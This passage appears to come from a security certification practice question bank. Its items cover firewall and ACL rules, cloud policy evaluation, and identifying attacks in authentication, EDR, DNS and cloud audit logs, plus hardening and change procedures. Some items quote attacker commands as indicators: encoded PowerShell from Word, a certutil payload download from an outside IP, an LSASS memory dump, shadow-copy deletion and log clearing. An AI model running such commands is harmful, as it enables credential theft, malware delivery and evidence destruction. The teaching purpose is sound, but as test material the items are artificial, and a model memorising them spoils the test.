Outbound from the CDE is limited to the processor's gateway over HTTPS. A destination of Any would let malware on PAYAPI send card data anywhere.
10.50.0.0/23 spans 10.50.0.0 to 10.50.1.255, exactly the two CDE subnets, so it covers every CDE server and nothing else. The /16 would be broader than needed, and either /24 would miss a subnet.

It must come after the JUMP01 allow, which it would otherwise block, and before the HTTPS allow in rule 6, which would otherwise let any corporate host reach PAYAPI on 443. The destination is the same /23, which covers exactly the CDE.
Internet destinations are unknown, so the destination is Any on TCP 443. Rule 5 has already removed the CDE from what this rule can reach.
The cleanup rule blocks everything else, including any other outbound traffic from the CDE.

takeaway: Segmenting the CDE shrinks PCI DSS scope only if the rules are tight: single-host sources into the database, one outbound destination, admin access only through the jump host, and a corporate deny placed above broad allows.

scenario: You are writing the rules on a branch firewall. It terminates an IPsec site-to-site tunnel to headquarters and routes between the branch VLANs. Both gateways have public addresses with no NAT between them. One stateful rule list applies to all traffic, after decryption, top to bottom, first match wins. For a protocol that has no port numbers, choose Not applicable in the Port column.
exhibit:
Internet ── [FW-BR outside 203.0.113.20] ──┬── USERS  10.80.10.0/24
        (IPsec tunnel to HQ)                └── MGMT   10.80.99.0/24  switch and AP management interfaces

HQ gateway public address: 198.51.100.10
HQ networks (through the tunnel): 10.1.0.0/16
  NOC-JUMP  10.1.9.9    network operations jump host
  MON01     10.1.9.20   SNMP trap receiver
stem: Complete the rule table so that it meets every requirement and follows least privilege.
requirements: The HQ gateway can negotiate the tunnel's security associations with this firewall.
Encrypted tunnel traffic from the HQ gateway is accepted.
Only the HQ network operations jump host can manage branch network devices, using an encrypted shell.
Branch network devices can send SNMP traps to MON01.
Branch users can never reach the management VLAN.
Branch users can reach web applications anywhere, at HQ or on the internet, over HTTPS.
Everything else is blocked.

rows.why: IKE negotiates the security associations on UDP 500. A site-to-site peer has a fixed address, so the source is the HQ gateway alone, not Any as it would be for roaming remote users.

With no NAT in the path, IPsec carries tunnel traffic as native ESP, IP protocol 50, which has no ports, so the Port column is Not applicable. UDP 4500 is only used when NAT traversal is needed, and AH would not encrypt anything.
SSH on TCP 22 is the encrypted shell, and the source is the single jump host rather than all of HQ. Telnet on 23 sends credentials in cleartext.
SNMP traps are sent by the managed device to the manager on UDP 162. UDP 161 is the port a device listens on for polling, which is the opposite direction.
Switch and AP management interfaces typically include web consoles on 443, so this deny has to sit above the users' HTTPS rule, or rule 6 would let every user reach them.
HQ and internet web apps both need to work, so the destination is Any on TCP 443. Rule 5 has already carved the management VLAN out.
The cleanup rule blocks everything else, including any HQ system other than the jump host trying to reach branch devices.

takeaway: Site-to-site IPsec needs UDP 500 for IKE plus ESP (protocol 50, no ports), or UDP 4500 instead of raw ESP when NAT sits in the path. SNMP traps go to UDP 162; polling goes to UDP 161.

scenario: You are hardening APP02, a Linux server that hosts an internal web app, by configuring its host-based firewall. The firewall is stateful, so replies to allowed connections pass automatically. Rules are processed top to bottom, first match wins.
exhibit:
APP02     10.30.5.40     web app on TCP 443

Corporate network   10.30.0.0/16
  Lobby kiosks      10.30.66.0/24   public, untrusted
  Admin subnet      10.30.9.0/24
    BAST01          10.30.9.10      bastion host
  MON01             10.30.8.15      monitoring server, collects metrics from
                                    the node exporter on TCP 9100
  NTP01             10.30.1.123     internal time server
stem: Complete the host firewall rules so that they meet every requirement and follow least privilege.
requirements: The lobby kiosks must not reach this server at all.
Anyone else on the corporate network can use the web app over HTTPS.
Administrators can open SSH sessions only from the bastion host.
The monitoring server can collect metrics from the node exporter.
The server can synchronize its clock with NTP01.
The server may not start any other outbound connection, so a web shell cannot download tools or call home.
All other inbound traffic is blocked.

rows.why: The kiosk subnet sits inside 10.30.0.0/16, so its deny must come before the corporate HTTPS allow. Placed after it, kiosks would match rule 2 and reach the web app.
The web app is HTTPS on TCP 443 for the whole corporate range. Kiosk traffic has already been dropped by rule 1.
The bastion host is the only allowed SSH source. Allowing the admin subnet would let any other machine there connect without passing through the bastion.
The monitoring server connects in to the node exporter on TCP 9100, so this is an inbound rule from that one host.
The server starts the NTP exchange, so the rule is outbound, to NTP01 only, on UDP 123.
Default deny outbound is what stops a compromised web app from fetching tools or opening a reverse shell. Replies to the allowed inbound sessions still pass because the firewall is stateful.
The inbound cleanup rule blocks every other connection attempt, including RDP or SSH from anywhere but the bastion.

takeaway: A host-based firewall needs egress rules too: default deny outbound, with explicit exceptions such as NTP, limits what an attacker can do after exploiting the service. Put a nested subnet's deny above the broader allow.

scenario: A cloud web subnet (10.0.1.0/24) is protected by a stateless network ACL. Rules are evaluated in ascending number order and the first match decides; the final * rule denies everything. Inbound rules match on the destination port of the arriving packet.
exhibit:
Inbound network ACL, web subnet 10.0.1.0/24
 Rule  Action  Proto  Source           Dest port
 100   allow   tcp    0.0.0.0/0        443
 110   deny    all    198.51.100.0/24  all
 120   allow   tcp    10.0.0.0/24      22
 130   allow   tcp    0.0.0.0/0        1024-65535
 *     deny    all    0.0.0.0/0        all
stem: Trace each inbound packet arriving at WEB01 (10.0.1.20) through the network ACL and choose the outcome.

prompts.label: 198.51.100.7:50122 → 10.0.1.20:443, TCP SYN
prompts.why: Rule 100 matches first: TCP to destination port 443 from any source. The deny for 198.51.100.0/24 is rule 110, so it is never reached for this packet. To block that range it must be numbered below 100.

prompts.label: 198.51.100.7:50123 → 10.0.1.20:22, TCP SYN
prompts.why: Rule 100 does not match port 22, and rule 110 denies all traffic from 198.51.100.0/24. Rule 120 would not have allowed it anyway, because the source is outside 10.0.0.0/24.

prompts.label: 10.0.0.5:49200 → 10.0.1.20:22, TCP SYN (from the bastion subnet)
prompts.why: Rules 100 and 110 do not match, and rule 120 permits TCP 22 from 10.0.0.0/24, which contains 10.0.0.5.

prompts.label: 203.0.113.50:443 → 10.0.1.20:51514, TCP ACK (reply to WEB01's own patch download)
prompts.why: A stateless ACL does not track the outbound session, so the reply is just another inbound packet to port 51514. Only rule 130, the ephemeral port range, lets it in.

prompts.label: 10.0.0.53:53 → 10.0.1.20:40211, UDP (reply from the internal DNS server to WEB01's query)
prompts.why: Rule 130 only covers TCP, and no rule allows UDP to high ports, so the DNS answer is dropped and name resolution fails. A matching UDP ephemeral rule is needed.

prompts.label: 203.0.113.9:61000 → 10.0.1.20:3389, TCP SYN (a new RDP attempt)
prompts.why: Port 3389 falls inside 1024 to 65535, so the return traffic rule also admits brand new connections to high ports. This is why a stateful security group should be layered on the instances.

prompts.label: 10.0.0.5 → 10.0.1.20, ICMP echo request
prompts.why: Every allow rule is TCP only and rule 110 does not match this source, so ICMP falls through to the final deny.

takeaway: A stateless ACL does not remember sessions: replies need explicit ephemeral port rules for each protocol, and those rules also admit new connections to high ports. Rule numbers decide order, so a deny numbered after an allow is shadowed for that traffic.

scenario: A next-generation firewall identifies applications by inspecting traffic rather than trusting port numbers, and maps IP addresses to directory users and groups. Its policy is processed top to bottom, first match wins, with an implicit deny at the end.
exhibit:
#  From   User/group   To                      Application        Action
 1  TRUST  any          any                     bittorrent         deny
 2  TRUST  Finance      PAYAPP (server zone)    ssl, web-browsing  allow
 3  TRUST  IT-Admins    SERVER zone             ssh, rdp           allow
 4  TRUST  any          INTERNET                ssl, web-browsing  allow
 5  TRUST  any          SERVER zone             any                deny
 6  GUEST  any          INTERNET                ssl, web-browsing  allow
    (implicit deny)
stem: Trace each session through the policy and choose the outcome.

prompts.label: A Finance user on a TRUST workstation opens PAYAPP over HTTPS
prompts.why: Rule 1 does not match the application. Rule 2 matches the zone, the Finance group, the destination and the ssl application.

prompts.label: A Sales user on a TRUST workstation opens PAYAPP over HTTPS
prompts.why: Rule 2 requires the Finance group, rule 3 requires IT-Admins, and rule 4 only covers the INTERNET zone. Rule 5 denies everything else from TRUST to the server zone.

prompts.label: A Finance user runs a BitTorrent client over TCP 443 to an internet peer
prompts.why: The firewall identifies the application as bittorrent even on port 443, and rule 1 denies it before the web allow in rule 4 is reached.

prompts.label: An IT administrator opens an SSH session on TCP 443 to a server on the internet
prompts.why: Rule 3 allows SSH only to the server zone, and rule 4 allows only ssl and web-browsing, so SSH disguised on port 443 matches neither. Rule 5 is for the server zone and rule 6 is for GUEST, so the implicit deny drops it.

prompts.label: An IT administrator opens RDP to a server in the server zone
prompts.why: Rule 3 matches the IT-Admins group, the server zone and the rdp application, and it sits above the server zone deny in rule 5.

prompts.label: A visitor on the GUEST network browses a news site over HTTPS
prompts.why: Rules 1 to 5 all apply to the TRUST zone only, so the session reaches rule 6, which allows web traffic from GUEST to the internet.

prompts.label: A visitor on the GUEST network tries RDP to a server in the server zone
prompts.why: No rule permits GUEST traffic to the server zone, and rule 5 only covers the TRUST zone, so the implicit deny drops it.

takeaway: Layer 7 rules match the real application and the user, not the port: BitTorrent or SSH on 443 is still identified and handled by its own rule. Still check every field, including the source zone, before deciding which rule matches.

scenario: A storage bucket holds company reports. The cloud provider evaluates every statement that applies to a request, in no particular order: an explicit deny overrides any allow, and a request that no statement allows is implicitly denied. A user receives the permissions of every group they belong to.
exhibit:
Bucket: corp-reports
 S1  Allow  group Analysts  read   reports/*
 S2  Allow  group Analysts  write  uploads/*
 S3  Deny   group Analysts  any    reports/hr/*
 S4  Deny   any principal   any    *   when the request is not made over TLS
 S5  Allow  group HR        read   reports/hr/*
stem: Choose the outcome of each request and the statement that decides it.

prompts.label: Priya (Analysts) reads reports/q3/sales.csv over HTTPS
prompts.why: S1 allows Analysts to read anything under reports/, and no deny applies: the object is not under reports/hr/ and the request uses TLS.

prompts.label: Priya (Analysts) reads reports/hr/salaries.csv over HTTPS
prompts.why: S1 would allow the read, but S3 explicitly denies Analysts everything under reports/hr/, and an explicit deny always wins over an allow.

prompts.label: Priya (Analysts) reads reports/q3/sales.csv over plain HTTP
prompts.why: S1 allows the read, but S4 denies any request that is not made over TLS, so the unencrypted request fails.

prompts.label: Priya (Analysts) uploads uploads/forecast.xlsx over HTTPS
prompts.why: S2 allows Analysts to write under uploads/, the request uses TLS, and no deny covers that path.

prompts.label: Priya (Analysts) deletes reports/q3/sales.csv over HTTPS
prompts.why: S1 grants only read on reports/ and S2 grants write only on uploads/. Nothing allows deleting this object, so it is implicitly denied even though no deny statement mentions it.

prompts.label: Omar (HR only) reads reports/hr/salaries.csv over HTTPS
prompts.why: S5 allows HR to read reports/hr/, Omar is not in Analysts so S3 does not apply, and the request uses TLS.

prompts.label: Lena (member of both Analysts and HR) reads reports/hr/salaries.csv over HTTPS
prompts.why: Lena gets S5's allow from HR, but she also gets S3's explicit deny from Analysts. An explicit deny overrides every allow, so the extra group does not help.

takeaway: Cloud policy evaluation is not first match: explicit deny beats any allow, an allow is needed for anything to work, and everything else is implicitly denied. Group memberships add up, including their denies.

scenario: Over one week the SOC collected the authentication events below from domain controllers, servers and the cloud identity provider. Each excerpt shows a different attack.
stem: Identify the attack or indicator that each excerpt shows.

prompts.label: DC01 4769 service ticket requested | user: jdoe | 46 different service accounts (MSSQLSvc/db01, HTTP/intranet, ...) in 2 minutes | ticket encryption 0x17 (RC4)
prompts.why: Requesting service tickets for many service accounts at once, asking for weak RC4 encryption, is Kerberoasting. The attacker cracks the tickets offline to recover the service account passwords.

prompts.label:
FS02, SQL01 and 29 other servers: 4624 logon type 3 | account svc-backup | auth package NTLM | source WS-114 | within 5 minutes
(svc-backup normally logs on only to BK01, using Kerberos)
prompts.why: Network logons with NTLM, from a workstation the account never uses, to many servers in minutes, point to a stolen password hash being replayed for lateral movement. Kerberos accounts falling back to NTLM is the classic tell.

prompts.label: IdP: user kpatel | MFA push denied x23 between 02:10 and 02:31 | MFA push approved 02:32 | new device registered 02:35
prompts.why: The attacker already has the password and floods the user with push prompts until one is approved, then registers their own device. Number matching or phishing-resistant MFA stops it.

prompts.label: IdP: 3,200 sign-ins from 1,100 IP addresses | 2,950 different usernames, each tried once with a different password | 41 successes | usernames and passwords match a breach of another website
prompts.why: Each account is tried with its own leaked password, from many addresses, and works only where users reused it. Spraying would try one common password across all the accounts.

prompts.label:
SRV07 4720 user account created: helpdesk2 by SYSTEM at 03:14
SRV07 4732 helpdesk2 added to Administrators
creating process: wmiprvse.exe, no change ticket
prompts.why: A new account, created by a remote management process at night, then made an administrator with no approved change, gives the attacker a way back in even if their first foothold is removed.

prompts.label: Identity threat detection: WS-114 requested service tickets (4769) using an Administrator TGT with a 10-year lifetime | no domain controller logged issuing that TGT (no matching 4768)
prompts.why: A ticket-granting ticket that no domain controller issued, with an absurd lifetime, was forged with the stolen krbtgt hash. Recovery requires resetting the krbtgt account password twice.

takeaway: Know the sub-types: Kerberoasting requests service tickets, pass-the-hash replays NTLM hashes, a golden ticket is a forged TGT, stuffing uses leaked pairs, spraying uses one password across many accounts.

scenario: EDR on several Windows endpoints recorded the process events below during an investigation.
stem: Identify the activity that each process event shows.
choices: Malicious macro in an Office document
Living off the land: built-in tool used to download a payload

prompts.label: parent: winword.exe → child: cmd.exe /c powershell.exe -nop -w hidden -enc JABjAD0A...
prompts.answer: Malicious macro in an Office document
prompts.why: Word has no reason to start a shell. A document spawning hidden, encoded PowerShell is the typical result of a user enabling a malicious macro from a phishing attachment.

prompts.label: certutil.exe -urlcache -split -f http://203.0.113.5/a.txt C:\Users\Public\a.exe
prompts.answer: Living off the land: built-in tool used to download a payload
prompts.why: Certutil is a signed Windows certificate utility. Abusing it to fetch an executable avoids bringing new tools, which is the living off the land technique.

prompts.label:
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\temp\d.dmp full
(PID 624 = lsass.exe)
prompts.why: Writing a memory dump of the LSASS process captures the hashes and tickets of logged-on users, which the attacker then extracts offline. Credential Guard and LSA protection reduce this risk.

prompts.label:
vssadmin.exe delete shadows /all /quiet
bcdedit.exe /set {default} recoveryenabled no
prompts.why: Deleting volume shadow copies and disabling Windows recovery removes the easy ways to roll files back, which ransomware does right before it starts encrypting.

prompts.label: schtasks.exe /create /sc onlogon /tn "OneDrive Sync Helper" /tr C:\Users\Public\a.exe /ru SYSTEM
prompts.why: A task that runs a binary from a public folder at every logon, named to look legitimate, keeps the malware running after reboots.

prompts.label: svchost64.exe (unsigned, C:\ProgramData\) | CPU 97% for 6 hours | outbound stratum+tcp://pool.example:3333
prompts.why: Sustained maximum CPU by an unsigned look-alike process connecting with the stratum mining protocol means the host's resources are being stolen to mine cryptocurrency.

prompts.label:
wevtutil.exe cl Security
wevtutil.exe cl System
prompts.why: Wiping the Security and System event logs destroys the local record of the intrusion. The clear itself generates an event (1102), which forwarding to a SIEM preserves.

takeaway: Process logs reveal intent through parent and child pairs and command lines: Office spawning a shell, signed tools fetching files, dumps of LSASS, shadow copy deletion and log clearing are all high-confidence indicators.

scenario: The DNS team pulled the excerpts below from resolver logs, registrar notices and the secure web gateway while investigating several unrelated tickets.
stem: Identify the attack or indicator that each excerpt shows.
choices: Encrypted DNS bypassing the company resolver

prompts.label: resolver: client 10.4.2.31 | 612 queries in 10 minutes | qxjvbtkze.com, plwmrnaht.net, zrkqofbwd.org, ... | 609 NXDOMAIN, 3 resolved
prompts.why: Malware with a DGA computes hundreds of random-looking domains and tries them until it finds the few the attacker registered. The flood of NXDOMAIN answers from one host is the signature.

prompts.label: resolver: 214 clients queried micros0ft-office365-login.com between 09:05 and 09:40, right after a mass email titled 'Password expires today'
prompts.why: The domain imitates a real brand with a swapped character and extra words, and the burst of lookups right after a phishing email shows users clicking the link.

prompts.label:
resolver cache: www.bank.example A 203.0.113.66 TTL 604800
authoritative servers for bank.example answer 192.0.2.10 TTL 300
prompts.why: The resolver holds a forged answer that differs from what the authoritative servers say, with an unusually long TTL to keep it cached. Every client using this resolver is sent to the attacker's address. DNSSEC validation prevents it.

prompts.label: ns1.corp.example: AXFR request for zone corp.example from 198.51.100.23 (internet)
prompts.why: An AXFR asks for the entire zone, which would hand an outsider a map of every host name. Zone transfers should be allowed only to the secondary name servers.

prompts.label: registrar notice: name servers for corp.example changed from ns1.corp.example to ns1.parkdns.example at 02:11; the change was approved from a new login to the company's registrar account
prompts.why: Taking over the registrar account and repointing the domain's name servers gives the attacker control of every record for the domain. Registrar MFA and a registry lock prevent it.

prompts.label: web gateway: host 10.4.7.12 sent no queries to the internal resolver for 3 days; steady HTTPS sessions to a public resolver's /dns-query endpoint
prompts.answer: Encrypted DNS bypassing the company resolver
prompts.why: DNS over HTTPS hides lookups inside ordinary web traffic, so the internal resolver's filtering and logging never see them. Blocking known DoH endpoints and enforcing the internal resolver closes the gap.

takeaway: DNS evidence has distinct shapes: NXDOMAIN storms are DGA, look-alike names are typosquatting, a cached answer that disagrees with the authoritative server is poisoning, AXFR from outside is recon, and registrar changes are hijacking.

scenario: After an access key for a CI pipeline account appeared in a public code repository, you are reviewing the cloud control plane audit log for the following days.
stem: Identify what each audit log entry shows.
choices: Disabling audit logging to evade detection
Public exposure through a permissive storage policy

prompts.label: StopLogging trail=org-audit by user ci-deploy from 185.220.101.4 at 03:02
prompts.answer: Disabling audit logging to evade detection
prompts.why: Turning off the organization's audit trail blinds investigators to everything that follows. Alerting on any change to logging and storing logs in a separate account guards against it.

prompts.label: PutBucketPolicy bucket=customer-exports Effect=Allow Principal="*" Action=GetObject
prompts.answer: Public exposure through a permissive storage policy
prompts.why: A principal of * lets anyone on the internet read the bucket's objects, turning private customer exports into a public download.

prompts.label: AttachUserPolicy user=ci-deploy policy=AdministratorAccess by user ci-deploy
prompts.why: The stolen identity used its own permission to modify IAM to grant itself full administrator rights. Pipeline accounts should never hold permission to change their own policies.

prompts.label: RunInstances x40 type=GPU in 6 regions the company has never used, tag Name="render"
prompts.why: Dozens of expensive GPU instances launched in unused regions are a classic use of stolen cloud keys for cryptocurrency mining, billed to the victim.

prompts.label: GetObject x18,400 bucket=hr-records in 20 minutes by role analytics-reader (normally about 50 per day), source IP outside the company
prompts.why: A role suddenly reading hundreds of times its normal volume, from an outside address, is copying the data out rather than doing its usual job.

prompts.label: CreateUser name=svc-backup2, CreateAccessKey user=svc-backup2, CreateLoginProfile user=svc-backup2 by user ci-deploy, no change ticket
prompts.why: A new identity with its own keys and console password survives revoking the leaked key, so the attacker keeps access after the original credential is rotated.

prompts.label: ConsoleLogin result=Success user=root MFAUsed=No source country not previously seen
prompts.why: The all-powerful root account should be locked away with MFA and used almost never. A successful password-only root login from a new country is a critical alert.

takeaway: In cloud audit logs, watch the control plane: logging changes, policies with a * principal, self-granted admin rights, new identities and keys, unusual regions or volumes, and any root login.

scenario: The weekly credentialed scan reports a critical remote code execution vulnerability in the web server package on 40 internet-facing servers. The vulnerability is listed in the CISA Known Exploited Vulnerabilities catalog.
stem: Put the vulnerability management steps for this finding in the correct order.

items.text: Record the finding from the credentialed scan and identify the affected servers
items.why: Identification comes first: the scan produces the finding, and you establish which assets are in scope.

items.text: Confirm the finding is real by checking the installed package version on the servers
items.why: Analysis starts by ruling out a false positive, for example a vendor backport that fixed the flaw without changing the version banner.

items.text: Prioritize it using CVSS, KEV exploitation status and asset exposure, and set a remediation deadline
items.why: Only a confirmed finding is prioritized. Active exploitation and internet exposure push this one to the top with a short deadline.

items.text: Submit a change request and apply the vendor patch in the approved window
items.why: Remediation goes through change management so the patch is tested, approved and can be rolled back if it breaks the service.

items.text: Rescan the servers to validate that the vulnerability is closed
items.why: Validation proves the fix worked on every host. A patch that failed silently on some servers would otherwise be reported as done.

items.text: Report the closure and update the vulnerability metrics and risk register
items.why: Reporting comes last, once the rescan confirms the result, so the records reflect the verified state.

takeaway: Vulnerability management runs identify, analyze (confirm, then prioritize), remediate through change management, validate with a rescan, then report. Never prioritize or patch a finding you have not confirmed.

scenario: At 22:00 the SOC confirms that an attacker is exploiting an exposed management port on the edge firewall's public address. The firewall team must block it tonight, but company policy still requires change management for every production change.
stem: Put the emergency change steps in the correct order.

items.text: Open an emergency change record with the exact rule, the risk of waiting and a backout plan
items.why: Even an emergency change starts with a record, so the request, its impact and how to undo it are written down before anyone touches production.

items.text: Get approval from the designated emergency change approver
items.why: Emergency changes skip the scheduled CAB meeting, not approval. An authorized approver (or the emergency CAB) signs off before the work starts.

items.text: Save the running configuration, then apply the block rule
items.why: Implementation follows approval, and saving the current configuration first makes the backout plan possible.

items.text: Verify that the attack traffic is blocked and that normal business traffic still flows
items.why: Testing after implementation confirms the change achieved its goal without breaking services. If it fails, the backout plan is used.

items.text: Update the firewall rule documentation and network diagrams before the shift ends
items.why: Documentation is updated once the change is confirmed, so records match the real configuration.

items.text: Present the change at the next scheduled CAB meeting for retrospective review, then close the record
items.why: Emergency changes are reviewed after the fact by the full board, which confirms the change was justified and should stay.

takeaway: An emergency change shortens change management but does not skip it: record, approve, implement with a backout plan, verify, document, then review retroactively at the CAB.

scenario: A new public web server, shop.example.com, needs a certificate from a public certificate authority. The private key must never leave the server.
stem: Put the certificate steps in the correct order.

items.text: Generate the key pair on the web server
items.why: Everything starts with the key pair. Creating it on the server itself means the private key never has to be copied anywhere.

items.text: Create a certificate signing request containing the public key and the server names
items.why: The CSR carries the public key and the subject and SAN names, and it is signed with the private key to prove possession. The private key is not included.

items.text: Submit the CSR to the CA and prove control of the domain
items.why: The CA must validate that the requester controls shop.example.com, for example with a DNS record or HTTP token, before it will sign anything.

items.text: Receive the certificate signed by the CA's issuing intermediate
items.why: After validation the CA signs the certificate with its intermediate key, binding the public key to the validated names.

items.text: Install the certificate and the intermediate chain on the web server
items.why: Installing the full chain matters, because clients that cannot build a path to a trusted root will reject the certificate.

items.text: Test the site from a client and set up monitoring for renewal before expiry
items.why: Testing confirms the names match and the chain validates, and renewal monitoring prevents an outage when the certificate expires.

takeaway: Key pair, CSR, CA validation, signed certificate, install with the intermediate chain, test and track expiry. The private key stays where it was generated; only the CSR travels.

scenario: A new access switch is going into a branch office. Requirements: administrators log in with their own accounts and every command is authorized and logged centrally; the monitoring system polls the switch and needs authenticated, encrypted access; in last year's penetration test the tester reached other VLANs by negotiating a trunk from a wall port and by sending double-tagged frames; a laptop once handed out a rogue default gateway over DHCP; only company laptops with device certificates may use wall ports.
stem: Choose the setting for each item.

prompts.label: Remote management protocol
prompts.why: SSHv2 encrypts the session and the login. Telnet and plain HTTP send credentials in cleartext, and SNMP write access is not a way to administer the switch securely.

prompts.label: Administrator authentication
prompts.answer: TACACS+ with a local break-glass account
prompts.why: TACACS+ gives individual logins with per-command authorization and central accounting. A local break-glass account keeps access possible if the TACACS+ servers are unreachable.
choices: One shared local admin account with a strong password
TACACS+ with a local break-glass account

prompts.label: Monitoring access
prompts.why: SNMPv3 in authPriv mode both authenticates and encrypts. SNMPv1 and v2c send the community string in cleartext, and noAuthNoPriv provides neither protection.

prompts.label: Wall ports: trunk negotiation
prompts.answer: Static access mode with trunk negotiation disabled
prompts.why: Switch spoofing works by negotiating a trunk from an access port. Forcing access mode and disabling negotiation (DTP) removes the trunk the tester used.
choices: Dynamic auto, so a trunk forms only when requested
Static access mode with trunk negotiation disabled

prompts.label: Uplink trunk: native VLAN
prompts.answer: An unused VLAN that carries no hosts
prompts.why: Double tagging only works when the attacker's access VLAN is the trunk's native VLAN. Moving the native VLAN to an unused one (and tagging it) defeats the attack; VLAN 1, the default, is the usual target because so many ports are left in it.
choices: An unused VLAN that carries no hosts

prompts.label: Unused ports
prompts.answer: Administratively shut down and placed in an unused VLAN
prompts.why: A disabled port in a dead-end VLAN gives anyone who plugs in nothing. Leaving ports enabled in VLAN 1 hands out network access to whoever finds a free jack.
choices: Administratively shut down and placed in an unused VLAN

prompts.label: Rogue DHCP servers
prompts.answer: DHCP snooping, trusting only the uplink port
prompts.why: DHCP snooping drops server replies (offers and acknowledgments) arriving on untrusted ports, so only the real server behind the uplink can hand out addresses and gateways. Dynamic ARP inspection builds on the snooping table but does not stop DHCP itself.
choices: DHCP snooping, trusting only the uplink port
Port security limited to one MAC address
Static IP addresses on every laptop

prompts.label: Admission to wall ports
prompts.why: 802.1X with EAP-TLS checks each laptop's device certificate before the port opens. MAC filtering and sticky MACs are easily spoofed and prove nothing about the device.
choices: Port security with sticky MAC addresses

takeaway: Switch hardening checklist: SSHv2 and TACACS+ for admins, SNMPv3 authPriv, access ports forced to access mode, native VLAN moved off VLAN 1, unused ports shut, DHCP snooping, and 802.1X for admission.

scenario: You are writing MDM policies for three device groups. Corporate-owned phones belong to the company and may be erased completely. Personal phones (BYOD) must keep work data separate, and the company may never erase personal photos or apps. Lobby tablets are shared by visitors for one check-in app and have been carried off before.
stem: Choose the policy setting for each item.

prompts.label: Lost or stolen phone
prompts.why: The company owns the device and everything on it, so erasing it completely is permitted and leaves nothing behind for the finder.
choices: Selective wipe of work apps only
Wait for the user to report it to the police

prompts.label: App installation
prompts.answer: Managed app catalog only, sideloading blocked
prompts.why: Restricting installs to approved apps and blocking sideloading keeps unvetted or trojanized apps off devices that hold company data.
choices: Any app from the public app store
Managed app catalog only, sideloading blocked
No restriction, scanned weekly by antivirus

prompts.label: Separating work data
prompts.why: A work container keeps corporate apps and data in their own encrypted space that the MDM controls, while personal data stays outside its reach.
choices: Full device management of the whole phone

prompts.label: Employee leaves or loses the phone
prompts.answer: Selective wipe of the work container
prompts.why: A selective wipe removes only company apps and data, which honors the rule that personal content may never be erased.
choices: Selective wipe of the work container
Remote lock of the whole device
Ask the user to delete the apps

prompts.label: Jailbroken or rooted phone detected
prompts.answer: Block access to company resources until it is compliant
prompts.why: A compliance check that denies access protects corporate data without touching the personal device. Wiping the whole phone is not allowed on BYOD.
choices: Allow access and show a warning
Block access to company resources until it is compliant
Ignore it, because the work data is containerized

prompts.label: Device mode
prompts.why: Locking the tablet to the check-in app stops visitors from browsing, changing settings or installing anything.
choices: Full user access with a guest account
Standard mode with a screen lock

prompts.label: Tablet leaves the building
prompts.answer: Geofencing that locks the tablet and alerts IT
prompts.why: A geofence triggers when the device crosses the premises boundary, so a carried-off tablet is locked and reported at once.
choices: Geofencing that locks the tablet and alerts IT
Geotagging of photos taken on the tablet

takeaway: Match the control to ownership: full wipe and app allow lists for corporate devices, containerization and selective wipe for BYOD, compliance blocking for jailbroken phones, kiosk mode and geofencing for shared devices.

scenario: A data protection review lists several gaps, grouped by the state of the data involved.
stem: Choose the control that BEST closes each gap.

prompts.label: Field staff often lose laptops, and data on a lost laptop must be unreadable to whoever finds it
prompts.why: Encrypting the whole drive protects every file at rest, including temporary files and caches, if the device is lost.

prompts.label: A merchant stores customers' cards for recurring billing, but its own systems must never hold a real card number
prompts.why: The payment provider keeps the real number in its vault and returns a token that is useless if stolen. Encrypting the field would still leave the real number, and the key, in the merchant's environment.

prompts.label: A web app stores user passwords, which must not be recoverable even if the database and its keys are stolen
prompts.why: Passwords should be hashed, not encrypted, so there is no key to steal. Salts defeat precomputed tables, and stretching (bcrypt, PBKDF2, Argon2) makes each guess slow.

prompts.label: A nightly payroll file is sent to the bank across the internet
prompts.why: The file is in transit over an untrusted network, so the channel must be encrypted. Signing alone would prove integrity but leave the contents readable.

prompts.label: Staff have been emailing spreadsheets of customer Social Security numbers to personal addresses
prompts.why: DLP inspects outgoing messages for patterns such as SSNs and blocks or quarantines them. Encrypting the email would protect the leak rather than stop it.

prompts.label: Researchers process genomic data on cloud VMs, and it must stay protected from the provider's administrators even while being computed
